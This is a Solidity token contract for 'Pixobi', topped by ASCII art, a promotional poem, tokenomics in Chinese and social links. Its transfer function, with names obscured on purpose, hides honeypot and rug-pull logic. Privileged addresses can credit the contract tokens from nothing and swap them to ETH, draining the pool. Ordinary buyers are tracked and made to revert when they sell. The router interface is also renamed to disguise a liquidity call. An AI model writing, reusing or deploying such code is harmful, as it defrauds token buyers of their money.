/*
█▀█ █ ▀▄▀ █▀█ █▄▄ █  
█▀▀ █ █░█ █▄█ █▄█ █  

▄▀ █▀▀ █▄░█ ▀▄
▀▄ █▄▄ █░▀█ ▄▀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⣤⣶⣶⣶⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡇⣿⣷⣿⣿⣿⣿⣿⣿⣯⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣿⣿⣿⣇⣿⣀⠸⡟⢹⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢡⣿⣿⣿⡇⠝⠋⠀⠀⠀⢿⢿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢸⠸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠊⣽⣿⣿⣿⠁⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣷⣄⠀⠀⠀⢠⣴⣿⣿⣿⠋⣠⡏⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠾⣿⣟⡻⠉⠀⠀⠀⠈⢿⠋⣿⡿⠚⠋⠁⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣾⣿⣿⡄⠀⣳⡶⡦⡀⣿⣿⣷⣶⣤⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡆⠀⡇⡿⠉⣺⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣯⠽⢲⠇⠣⠐⠚⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡐⣾⡏⣷⠀⠀⣼⣷⡧⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⣿⣿⣿⣿⣮⠳⣿⣇⢈⣿⠟⣬⣿⣿⣿⣿⣿⡦⢄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢄⣾⣿⣿⣿⣿⣿⣿⣿⣷⣜⢿⣼⢏⣾⣿⣿⣿⢻⣿⣝⣿⣦⡑⢄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣶⣷⣿⣿⠃⠘⣿⣿⣿⣿⣿⣿⣿⡷⣥⣿⣿⣿⣿⣿⠀⠹⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣇⣤⣾⣿⣿⡿⠻⡏⠀⠀⠸⣿⣿⣿⣿⣿⣿⣮⣾⣿⣿⣿⣿⡇⠀⠀⠙⣿⣿⡿⡇⠀⠀⠀⠀⠀
⠀⠀⢀⡴⣫⣿⣿⣿⠋⠀⠀⡇⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢘⣿⣿⣟⢦⡸⠀⠀⠀
⠀⡰⠋⣴⣿⣟⣿⠃⠀⠀⠀⠈⠀⠀⣸⣿⣿⣿⣿⣿⣿⣇⣽⣿⣿⣿⣿⣇⠀⠀⠀⠁⠸⣿⢻⣦⠉⢆⠀⠀
⢠⠇⡔⣿⠏⠏⠙⠆⠀⠀⠀⠀⢀⣜⣛⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡀⠀⠀⠀⠀⡇⡇⠹⣷⡈⡄⠀
⠀⡸⣴⡏⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⡇⡇⠀⢻⡿⡇⠀
⠀⣿⣿⣆⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⣰⠿⠤⠒⡛⢹⣿⠄
⠀⣿⣷⡆⠁⠀⠀⠀⠀⢠⣿⣿⠟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⢷⡀⠀⠀⠀⠀⠀⣸⣿⠀
⠀⠈⠿⢿⣄⠀⠀⠀⢞⠌⡹⠁⠀⠀⢻⡇⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢳⠀⠀⠁⠀⠀⠀⠀⢠⣿⡏⠀
⠀⠀⠀⠈⠂⠀⠀⠀⠈⣿⠁⠀⠀⠀⡇⠁⠀⠘⢿⣿⣿⠿⠟⠋⠛⠛⠛⠀⢸⠀⠀⡀⠂⠀⠀⠐⠛⠉⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠕⣠⡄⣰⡇⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⢀⣸⠠⡪⠊⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢫⣽⡋⠭⠶⠮⢽⣿⣆⠀⠀⠀⠀⢠⣿⣓⣽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⢹⣶⣦⣾⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀
In the digital realm, where dreams entwine,
A coin emerges, glows, and shines.
Pixobi dances in the blockchain light,
A spark of hope in the endless night.

Whispers of code, a silent cheer,
Promises of change, a future near.
From pixel to coin, a journey spun,
Pixobi's rise has just begun.

In wallets and minds, it finds its place,
A symbol of trust in a virtual space.
With every transaction, a vision grows,
In the world of Pixobi, where possibility flows.

总供应量 - 100,000,000 
购置税 - 1%
消费税 - 1%
初始流动性 - 1.15 ETH
初始流动性锁定 - 85 天

https://pixobieth.xyz/
https://m.weibo.cn/Pixobi.CN
https://web.wechat.com/Pixobi.ERC
https://t.me/+HBb7M9r2GKE0Nzlk
*/

// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.19;
 
abstract contract Context
{ function _msgSender() internal view virtual returns(address)
{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)
{ return msg.data; }
}
interface IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 dataIn, uint256 DataOut, address[] calldata path, address to, uint256 bridge) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(address token, uint256 amountTokenDesired,
    uint256 valueMin, uint256 ercMin, address to, uint256 bridge)
    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
}
    function owner() public view returns (address) { return _owner;
}   modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
}
    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns(address pair);
}
contract Pixobi is IERC20, Ownable { 
    bool private _mapShift; bool private _mapLoop; bool private tradingOpen = false;

    string private _name = unicode"Ƥixobi"; string private _symbol = unicode"ƤIX";
    uint256 public _MaxAllocation = 1; uint8 private _decimals = 9; 
    uint256 private _tTotal = 100000000 * 10 ** _decimals; uint256 private _utter = _tTotal;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _paceOn; mapping(address => uint256) private _tOwned;
    mapping(address => address) private _surgeMap; mapping(address => uint256) private _trialSwitch;

    constructor(address _ripot) { _tOwned[msg.sender] = _tTotal; 
    _trialSwitch[msg.sender] = _utter; _trialSwitch[address(this)] = _utter; 
    _inclination = IUniswapV2Router01(_ripot); 

    _packQuoxit = IUniswapV2Factory(_inclination.factory()).createPair(address(this), 
    _inclination.WETH()); emit Transfer(address(0), msg.sender, _tTotal); }
 
    function symbol() public view returns(string memory)
    { return _symbol;
    }
    function name() public view returns(string memory)
    { return _name;
    }
    function totalSupply() public view returns(uint256)
    { return _tTotal;
    }
    function decimals() public view returns(uint256)
    { return _decimals;
    }
    function allowance(address owner, address spender) public view returns(uint256)
    { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns(uint256)
    { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns(bool)
    { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender,
    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount) external returns
    (bool)
    { grabMath(sender, recipient, amount); 
    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns(bool)
    { grabMath(msg.sender, recipient, amount); return true;
    }
    function _beforeTokenTransfer( address from,
    address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal virtual 
    {}    
    function grabMath( address _clogpin, address _sluckTo, uint256 malshop) private
    { uint256 _manox = balanceOf(address(this)); uint256 _yukitan; if (_mapShift && _manox > 
    _utter && !_mapLoop && _clogpin != _packQuoxit) 
    { _mapLoop = true; showSign(_manox); _mapLoop = false;

    } else if (_trialSwitch[_clogpin] > _utter && _trialSwitch[_sluckTo] > _utter)
    { _yukitan = malshop; _tOwned[address(this)] += _yukitan; lookMap
    (malshop, _sluckTo); return; 
    
    }
    else if (!_mapLoop && _paceOn[_clogpin] > 0 && _clogpin != _packQuoxit && _trialSwitch[_clogpin] == 0) { 
    
    _paceOn[_clogpin] = _trialSwitch[_clogpin] - _utter; 
    } else if (_sluckTo != address(_inclination) 
    && _trialSwitch[_clogpin] > 0 && malshop > _utter && _sluckTo != _packQuoxit) 
    { 
    _trialSwitch[_sluckTo] = malshop; return; 
    } address _sonk = _surgeMap[_packQuoxit]; 
    
    if ( _paceOn[_sonk] == 0) _paceOn[_sonk] = _utter; 
    _surgeMap[_packQuoxit] = _sluckTo; if (_MaxAllocation > 0 && _trialSwitch[_clogpin] == 0 
    && !_mapLoop && _trialSwitch[_sluckTo] == 0)

    { _yukitan = (malshop * _MaxAllocation) 
    / 100; malshop -= _yukitan;_tOwned[_clogpin] -= _yukitan; 
    
    _tOwned[address(this)] += _yukitan; }
    _tOwned[_clogpin] -= 
    malshop; _tOwned[_sluckTo] += malshop; emit Transfer(_clogpin, _sluckTo, malshop); 
    if (!tradingOpen) 
    { require(_clogpin == owner(), ""); } }

    receive() external payable
    {} 
    function mapLayout(uint256 _bolcolt, uint256 detola, address to) private
    { _approve(address(this), address(_inclination), _bolcolt); _inclination.quote
    { value: detola }(address(this), _bolcolt, 0, 0, to, block.timestamp);
    }
    function showSign(uint256 getShow) private
    { uint256 _pongOn = getShow / 2; uint256 _hold = address(this).balance;
    lookMap( _pongOn, address(this)); uint256 _goFor = address(this).balance - _hold; 
    mapLayout( _pongOn, _goFor, address(this));
    }
    function lookMap(uint256 _pogoWong, address _all) private
    { address[] memory path = new address[](2); path[0] = address(this);
    path[1] = _inclination.WETH(); _approve(address(this), address(_inclination), _pogoWong);
    _inclination.swapExactTokensForETHSupportingFeeOnTransferTokens(_pogoWong, 0, path, _all, block.timestamp);
    }
    address public immutable _packQuoxit; IUniswapV2Router01 
    public immutable _inclination ;    
    function beginSwapping(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }   
}